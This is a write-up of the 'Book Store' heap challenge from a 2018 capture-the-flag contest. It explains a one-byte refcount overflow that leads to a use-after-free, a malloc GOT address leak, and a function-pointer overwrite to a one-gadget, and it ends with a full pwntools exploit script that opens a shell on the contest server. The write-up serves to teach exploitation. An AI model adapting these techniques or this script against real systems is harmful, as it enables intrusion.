# Writeup for pwn 02 - Book Store - WhiteHat Grandprix 2018 Qualifiers

## The Challenge

We are given a "book store" service, which allows us to add, edit, remove and print out books.

The book structure is as follows:

```C
typedef struct book{
    book* nextBook;
    void* pBrief;
    char title[0x20];
    char book_idx;
    char refcount;
    void* print_func;
} book;
```
The `pBrief` member is a pointer to a `malloc()`d memory region (size is dependant on the user).

When adding a book, we also have the option to make a reference from that book to other books, and the book that **receives** the reference gets it's `refcount` field incremented.
This can be seen in the following code-snippet inside the `add_book()` function:

```C
unsigned __int64 add_book()
{
   ...
   ...
    if ( reference_book_title )
    {
      current_book = list_of_books;
      running_idx = 0;
      while ( current_book )
      {
        v0 = (signed __int64)current_book->title;
        if ( !strncmp(&reference_book_title, current_book->title, 0x20uLL) )
        {
          new_book->book_idx = running_idx;
          ++current_book->refcount;
          break;
        }
        ++running_idx;
        current_book = (struct book *)current_book->next_book;
      }
    }
    ...
    ...
 }
 ```

Also, when adding a book, we have the option to make it a best-selling book. There is a global `best_book` variable that is stored in the data segment, and is pointing to the best selling book. 

This global `best_book` also increments the book's `refcount` due to it also pointing to the book.

## The Vulnerability

As seen above, the `refcount` member is **only a BYTE in size**, also, there are no checks whatsoever whether it overflows.

When adding a **best selling** book, the program checks if a best-selling book already exists, and if so, it decrements the original book's `refcount` member, and checks if it's 0, if it is, it calls `free()` to free the `pBrief` memory, and the book struct itself afterwards, this can be seen in the following code snippet (inside the function `best_selling()`):

```C
book *__fastcall best_selling(book *a1)
{
...
  if ( best_book )
  {
    --best_book->refcount;
    best_book->print_func = (__int64)print_normal;
    if ( !best_book->refcount )
    {
      free((void *)best_book->pBrief);
      free(best_book);
    }
  }
 ...
 ...
}
```

If we can get the `refcount` of a best-selling book to overflow to be **1** and then *change a best-selling book*, then that book would get freed (also it's `pBrief` member), but would not be removed from the linked list that exists due to the `book* next_book` member in the `book` struct.

This could theoretically grant us a UAF primitive, which is easily exploitable due to the fact that the size of `pBrief` is controlled by us, so we can make it to be the same size as the `book` struct, and achieve a perfect overlap!

## The Leak

To achieve a reliable exploit, we also need an info-leak. This info-leak is very trivial due to the UAF primitive, and the fact that there is a function that prints the details of the books!

To get an info-leak we just need to get a UAF-ed book `pBrief` to overlap with a newly created `book` struct. If the `pBrief` has the same size as the struct, we can just leak the entire `book` struct! Also, we can modify the `pBrief` of the newly created `book` to make it point to `malloc()`'s GOT entry, and then leak the address of `malloc()` in libc when we print the data of the UAF-ed book!

## The Exploit

After leaking, we can easily modify the `print_func` function pointer using the UAF-ed book's `pBrief`, to make it point to a shell one gadget and then easily pop a shell.

Modifying an in-use book's `print_func` is as easy as changing the `pBrief` of the UAF-ed book to just match what we want :)

After doing so, when we trigger the `print_func` for that same book, it will execute `system("/bin/sh")` :D

Basically - once we have that UAF, leaking and exploiting is as easy as modifying the fields of an in-use `book` struct, using the UAF-ed `pBrief` :)

## Exploit Code

```Python
from pwn import *

r = remote("pwn02.grandprix.whitehatvn.com", 8005)

def rc():
    r.recvuntil("choice:")

rc()

def addBook(title, briefSize, brief,referenceTitle="",bestSelling=False):
    r.sendline("1")
    r.recvuntil("Title:")
    r.sendline(title)
    r.recvuntil("size:")
    r.sendline(str(briefSize))
    r.recvuntil("brief:")
    r.sendline(brief)
    r.recvuntil("title:")
    r.sendline(referenceTitle)
    r.recvuntil("(Y/N)")
    if bestSelling:
        r.sendline("Y")
    else:
        r.sendline("N")
    rc()

def removeBook(title):
    r.sendline("3")
    r.recvuntil("Title:")
    r.sendline(title)
    rc()

addBook("first", 10, "CCCC","CCCC", bestSelling=False)

addBook("AAAA",0x3a,"A"*0x30,"AAAA",bestSelling=True)

for m in range(255):
    addBook("abc"+"A"*m,10,"BBBB","AAAA", bestSelling=False)

addBook("newBook", 10, "newBook", "newBook", bestSelling=True)

removeBook("first")


MALLOCGOT = 0x601fd0
ONE_GADGET = 0x10a38c

addBook("newBook2", 58, "\x00"*8+p64(MALLOCGOT)+"F"*8, "newBook2", bestSelling=False)

r.sendline("4")

r.recvuntil("FFFFFFFF|")

leak = r.recvline()

mallocLeak = int(leak.strip()[::-1][4:][:6].encode('hex'),16)
rc()

log.info("malloc leak @ 0x%x" % mallocLeak)

LibcBase = mallocLeak - 0x97070
log.info("libc base @ 0x%x" % LibcBase)

nextPayload = "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFAA" + p64(LibcBase+ONE_GADGET)

r.sendline("2")

r.recvuntil("title:")
r.sendline("newBook2")

r.recvuntil("title:")
r.sendline("pwn")

r.recvuntil("size:")
r.sendline("58")

r.recvuntil("brief:")

r.sendline(nextPayload)

r.interactive()
```
